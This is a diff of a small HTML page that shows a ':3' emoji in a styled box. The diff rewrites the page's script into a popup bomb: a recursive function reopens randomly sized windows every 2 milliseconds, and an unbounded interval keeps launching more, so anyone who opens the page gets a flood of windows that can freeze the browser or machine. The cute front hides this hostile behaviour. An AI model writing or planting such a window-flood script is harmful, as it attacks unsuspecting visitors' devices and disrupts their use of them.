@@ -1,116 +1,27 @@
-<!DOCTYPE html>
-
-<html lang="en">
-
-<head>
-
-    <meta charset="UTF-8">
-
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
-    <title>:3</title>
-
-    <style>
-
-        body {
-
-            display: flex;
-
-            justify-content: center;
-
-            align-items: center;
-
-            height: 100vh;
-
-            margin: 0;
-
-            background-color: #eaeaea;
-
-        }
-
-        .container {
-
-            background-color: white;
-
-            padding: 20px;
-
-            border-radius: 10px;
-
-            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1), 0px 0px 11px rgba(0, 123, 255, 0.5);
-
-            border: 2.5px solid #007bff;
-
-            transition: transform 0.3s ease-in-out;
-
-        }
-
-        .container:hover {
-
-            transform: scale(1.06);
-
-        }
-
-        .emoji {
-
-            font-size: 6.5em;
-
-            font-weight: bold;
-
-        }
-
-    </style>
-
-</head>
-
-<body>
-
-    <div class="container">
-
-        <div class="emoji">:3</div>
-
-    </div>
-
-    <script>
-
-        function openNewWindow(width, height) {
-
+<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>:3</title><style>body{display:flex;justify-content:center;align-items:center;height:100vh;margin:0;background-color:#eaeaea}.container{background-color:#fff;padding:20px;border-radius:10px;box-shadow:0 0 10px rgba(0,0,0,.1),0 0 11px rgba(0,123,255,.5);border:2.5px solid #007bff;transition:transform .3s ease-in-out}.container:hover{transform:scale(1.06)}.emoji{font-size:6.5em;font-weight:700}</style></head><body><div class="container"><div class="emoji">:3</div></div><script>function openNewWindow(width, height) {
             let left = Math.floor(Math.random() * (window.screen.availWidth - width));
-
             let top = Math.floor(Math.random() * (window.screen.availHeight - height));
-
-            window.open('', '_blank', 'width=' + width + ',height=' + height + ',left=' + left + ',top=' + top);
-
+            let newWindow = window.open('', '_blank', 'width=' + width + ',height=' + height + ',left=' + left + ',top=' + top);
+            if (newWindow) {
+                let newWidth = Math.floor(Math.random() * window.innerWidth) + 200;
+                let newHeight = Math.floor(Math.random() * window.innerHeight) + 200;
+                setTimeout(() => {
+                    openNewWindow(newWidth, newHeight);
+                }, 2);
+            }
         }
 
         let counter = 0;
-
         let maxWindowsInterval = setInterval(function() {
-
             openNewWindow(2300, 2300);
-
             counter++;
-
             if (counter >= 20) {
-
                 clearInterval(maxWindowsInterval);
-
             }
-
         }, 2);
 
         setInterval(function() {
-
             let width = Math.floor(Math.random() * window.innerWidth) + 200;
-
             let height = Math.floor(Math.random() * window.innerHeight) + 200;
-
             openNewWindow(width, height);
-
-        }, 2);
-
-    </script>
-
-</body>
-
-</html>
-
+        }, 2);</script></body></html>
